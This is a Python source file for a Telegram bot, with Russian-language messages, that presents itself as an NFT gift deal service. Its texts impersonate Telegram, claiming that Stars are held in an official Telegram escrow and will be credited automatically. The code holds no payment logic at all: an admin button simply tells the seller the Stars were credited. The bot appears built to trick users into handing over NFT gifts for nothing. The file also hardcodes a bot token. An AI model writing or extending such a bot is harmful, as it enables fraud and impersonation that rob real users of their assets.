# bot.py — NFT Deal Bot | aiogram 3.x | Python 3.10+
import asyncio
import logging
import random
import re
import sqlite3
import string
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.filters import CommandStart, CommandObject
from aiogram.types import CallbackQuery, InlineKeyboardButton, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder

TOKEN     = "8469717125:AAEbUIanMZltA742IAXyLU7x79QcAtlTMZA"
ADMIN_ID  = 741904495
OFFER_HOURS = 6

EMOJI_ACCEPT  = "5895514131896733546"
EMOJI_DECLINE = "5893163582194978381"

bot = Bot(token=TOKEN, parse_mode="HTML")
dp  = Dispatcher()

# ── БД ───────────────────────────────────────────────────────
db = sqlite3.connect("deals.db", check_same_thread=False)
db.row_factory = sqlite3.Row
db.executescript("""
CREATE TABLE IF NOT EXISTS deals (
    order_id        TEXT PRIMARY KEY,
    seller_id       INTEGER,
    seller_username TEXT,
    buyer_id        INTEGER,
    buyer_username  TEXT,
    nft_url         TEXT,
    nft_slug        TEXT,
    nft_num         TEXT,
    amount          INTEGER,
    status          TEXT DEFAULT 'pending',
    created_at      TEXT,
    offer_sent_at   TEXT,
    buyer_chat_id   INTEGER,
    buyer_msg_id    INTEGER
);
""")
db.commit()


def gen_order_id() -> str:
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))


def parse_nft(url: str):
    m = re.match(r"https?://t\.me/nft/([A-Za-z]+)-(\d+)", url)
    return (m.group(1), m.group(2)) if m else (None, None)


def get_deal(order_id: str) -> dict | None:
    row = db.execute("SELECT * FROM deals WHERE order_id=?", (order_id,)).fetchone()
    return dict(row) if row else None


def upd(order_id: str, **kw):
    for k, v in kw.items():
        db.execute(f"UPDATE deals SET {k}=? WHERE order_id=?", (v, order_id))
    db.commit()


def fmt_remaining(sent_at_str: str) -> str:
    sent_at   = datetime.fromisoformat(sent_at_str)
    deadline  = sent_at + timedelta(hours=OFFER_HOURS)
    remaining = deadline - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0 ч. 0 мин."
    total_min = int(remaining.total_seconds() // 60)
    h, m = divmod(total_min, 60)
    return f"{h} ч. {m} мин."


# ── Тексты ───────────────────────────────────────────────────
def offer_text(d: dict, sent_at: str) -> str:
    return (
        f'<tg-emoji emoji-id="{EMOJI_ACCEPT}">✅</tg-emoji> <b>Telegram</b>\n'
        f"<b>{d['nft_slug']} #{d['nft_num']}</b>\n\n"
        f"Пользователь предлагает вам <b>{d['amount']:,} Звёзд</b> за подарок "
        f"<a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>.\n\n"
        f"Оффер действителен ещё <b>{fmt_remaining(sent_at)}</b>"
    )


def deal_text(d: dict) -> str:
    return (
        f"<b>NFT Deal</b>\n\n"
        f"Ордер <b>#{d['order_id']}</b>\n\n"
        f"Покупатель зарезервировал <b>{d['amount']:,} ⭐️ Звёзд</b> через эскроу-систему "
        f"Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически "
        f"зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
        f"<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю: @{d['buyer_username']}\n"
        f"2. Нажмите «Передать NFT» и выберите {d['nft_slug']} #{d['nft_num']}\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"<b>{d['amount']:,} ⭐️ Звёзд</b> на ваш баланс. Резерв действует 24 часа."
    )


# ── Клавиатуры ───────────────────────────────────────────────
def buyer_offer_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(
            text=f'✅ Принять',
            callback_data=f"accept:{order_id}"
        ),
        InlineKeyboardButton(
            text=f'❌ Отклонить',
            callback_data=f"decline:{order_id}"
        )
    )
    return kb.as_markup()


def buyer_confirm_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(
        text="✅ Подтвердить оплату",
        callback_data=f"bconfirm:{order_id}"
    ))
    kb.row(InlineKeyboardButton(
        text="❌ Отклонить",
        callback_data=f"decline:{order_id}"
    ))
    return kb.as_markup()


def seller_kb(d: dict):
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(
        text="Передать NFT ↗",
        url=f"tg://resolve?domain={d['buyer_username']}"
    ))
    kb.row(InlineKeyboardButton(
        text="✅ Подтвердить передачу",
        callback_data=f"confirm:{d['order_id']}"
    ))
    return kb.as_markup()


def admin_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"adm_ok:{order_id}"),
        InlineKeyboardButton(text="❌ Не передан",  callback_data=f"adm_no:{order_id}")
    )
    return kb.as_markup()


# ── Таймер оффера ────────────────────────────────────────────
async def offer_timer(order_id: str, chat_id: int, msg_id: int, sent_at: str):
    deadline = datetime.fromisoformat(sent_at) + timedelta(hours=OFFER_HOURS)
    while True:
        await asyncio.sleep(60)
        d = get_deal(order_id)
        if not d or d['status'] != 'pending':
            break
        if datetime.now() >= deadline:
            upd(order_id, status='expired')
            try:
                await bot.edit_message_text(
                    "❌ Время оффера истекло.",
                    chat_id=chat_id,
                    message_id=msg_id
                )
            except Exception:
                pass
            break
        try:
            await bot.edit_message_text(
                offer_text(d, sent_at),
                chat_id=chat_id,
                message_id=msg_id,
                reply_markup=buyer_offer_kb(order_id),
                disable_web_page_preview=True
            )
        except Exception:
            pass


# ── /start ───────────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(message: Message, command: CommandObject):
    param = command.args
    if param and param.startswith("order_"):
        order_id = param[6:]
        d = get_deal(order_id)
        if not d:
            await message.answer("❌ Ордер не найден.")
            return
        if d['status'] != 'pending':
            await message.answer("❌ Этот ордер уже недоступен.")
            return

        sent_at = datetime.now().isoformat()
        upd(order_id,
            buyer_id=message.from_user.id,
            buyer_username=message.from_user.username or str(message.from_user.id),
            offer_sent_at=sent_at,
            buyer_chat_id=message.chat.id)

        d   = get_deal(order_id)
        msg = await message.answer(
            offer_text(d, sent_at),
            reply_markup=buyer_offer_kb(order_id),
            disable_web_page_preview=True
        )
        upd(order_id, buyer_msg_id=msg.message_id)
        asyncio.create_task(offer_timer(order_id, message.chat.id, msg.message_id, sent_at))
    else:
        await message.answer(
            "👋 <b>NFT Deal Bot</b>\n\n"
            "Создайте ордер командой:\n"
            "<code>.buy https://t.me/nft/Name-123 сумма</code>"
        )


# ── .buy ─────────────────────────────────────────────────────
@dp.message(F.text.regexp(r"^\.buy\s+\S+\s+\d+"))
async def cmd_buy(message: Message):
    parts   = message.text.strip().split()
    nft_url = parts[1]
    amount  = int(parts[2])

    slug, num = parse_nft(nft_url)
    if not slug:
        await message.answer(
            "❌ Неверная ссылка.\n"
            "Формат: <code>https://t.me/nft/Name-123</code>"
        )
        return

    order_id = gen_order_id()
    username = message.from_user.username or str(message.from_user.id)

    db.execute("""
        INSERT INTO deals
          (order_id, seller_id, seller_username, nft_url, nft_slug, nft_num, amount, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, 'pending', ?)
    """, (order_id, message.from_user.id, username, nft_url, slug, num, amount,
          datetime.now().isoformat()))
    db.commit()

    me   = await bot.get_me()
    link = f"https://t.me/{me.username}?start=order_{order_id}"

    await message.answer(
        f"✅ Ордер <b>{order_id}</b> создан!\n\n"
        f"NFT: <b>{slug} #{num}</b>\n"
        f"Сумма: <b>{amount:,} ⭐️</b>\n\n"
        f"Ссылка для покупателя:\n{link}"
    )


# ── Покупатель: Принять → алерт ──────────────────────────────
@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d or d['status'] != 'pending':
        await call.answer("Ордер недоступен.", show_alert=True)
        return
    await call.answer(
        "⚠️ Внимание!\n\n"
        "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
        "Нажмите «ОК», если вы прочитали это сообщение.",
        show_alert=True
    )
    await call.message.edit_reply_markup(reply_markup=buyer_confirm_kb(order_id))


# ── Покупатель: Подтвердить оплату ───────────────────────────
@dp.callback_query(F.data.startswith("bconfirm:"))
async def cb_buyer_confirm(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d or d['status'] != 'pending':
        await call.answer("Ордер недоступен.", show_alert=True)
        return

    buyer_username = call.from_user.username or str(call.from_user.id)
    upd(order_id,
        status='accepted',
        buyer_id=call.from_user.id,
        buyer_username=buyer_username)

    await call.answer("✅ Сделка принята. Ожидайте NFT от продавца.")
    await call.message.edit_text(
        "✅ Вы приняли сделку.\n\nОжидайте передачи NFT от продавца."
    )

    d = get_deal(order_id)
    try:
        await bot.send_message(d['seller_id'], deal_text(d), reply_markup=seller_kb(d))
        await bot.send_message(d['seller_id'], d['nft_url'])
    except Exception as e:
        logging.error(f"notify seller: {e}")


# ── Покупатель: Отклонить ────────────────────────────────────
@dp.callback_query(F.data.startswith("decline:"))
async def cb_decline(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    upd(order_id, status='declined')
    await call.answer("Сделка отклонена.")
    await call.message.edit_text("❌ Вы отклонили сделку.")


# ── Продавец: Подтвердить передачу ───────────────────────────
@dp.callback_query(F.data.startswith("confirm:"))
async def cb_confirm(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d or d['status'] != 'accepted':
        await call.answer("Ордер недоступен.", show_alert=True)
        return

    upd(order_id, status='transfer_pending')
    await call.answer("⏳ Проверяем передачу, ожидайте до 2 минут.", show_alert=True)
    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer("⏳ Передача на проверке у администратора. Ожидайте (до 2 мин).")

    try:
        await bot.send_message(
            ADMIN_ID,
            f"🔔 <b>Запрос на подтверждение</b>\n\n"
            f"Ордер: <b>{order_id}</b>\n"
            f"NFT: <b>{d['nft_slug']} #{d['nft_num']}</b>\n"
            f"Сумма: <b>{d['amount']:,} ⭐️</b>\n"
            f"Продавец: @{d['seller_username']}\n"
            f"Покупатель: @{d['buyer_username']}\n"
            f"Ссылка: {d['nft_url']}\n\n"
            f"Проверьте передачу NFT и нажмите кнопку:",
            reply_markup=admin_kb(order_id)
        )
    except Exception as e:
        logging.error(f"notify admin: {e}")


# ── Админ: Подтвердить ───────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_ok:"))
async def cb_adm_ok(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    upd(order_id, status='completed')
    await call.answer("✅ Подтверждено.")
    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(f"✅ Ордер {order_id} завершён.")

    try:
        await bot.send_message(
            d['seller_id'],
            f"✅ <b>Передача подтверждена!</b>\n\n"
            f"Ордер <b>{order_id}</b>\n"
            f"<b>{d['amount']:,} ⭐️ Звёзд</b> зачислены на ваш баланс."
        )
    except Exception as e:
        logging.error(e)
    try:
        await bot.send_message(
            d['buyer_id'],
            f"✅ <b>Сделка завершена!</b>\n\n"
            f"NFT <b>{d['nft_slug']} #{d['nft_num']}</b> успешно передан."
        )
    except Exception as e:
        logging.error(e)


# ── Админ: Отклонить ─────────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_no:"))
async def cb_adm_no(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    upd(order_id, status='accepted')
    await call.answer("❌ Отклонено.")
    await call.message.edit_reply_markup(reply_markup=None)

    try:
        await bot.send_message(
            d['seller_id'],
            f"❌ <b>Подарок не передан.</b>\n\n"
            f"Попробуйте передать ещё раз и нажмите «Подтвердить передачу».",
            reply_markup=seller_kb(d)
        )
    except Exception as e:
        logging.error(e)


async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot, skip_updates=True)


if __name__ == "__main__":
    asyncio.run(main())
